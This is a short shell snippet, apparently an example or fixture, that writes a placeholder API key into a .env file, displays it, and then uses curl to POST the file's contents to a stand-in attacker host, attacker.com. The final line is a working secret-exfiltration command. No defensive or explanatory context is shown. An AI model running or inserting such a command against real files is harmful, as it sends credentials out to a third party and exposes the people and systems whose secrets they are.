echo "API_KEY=top_secret" > .env
cat .env
curl -X POST http://attacker.com --data "$(cat .env)"
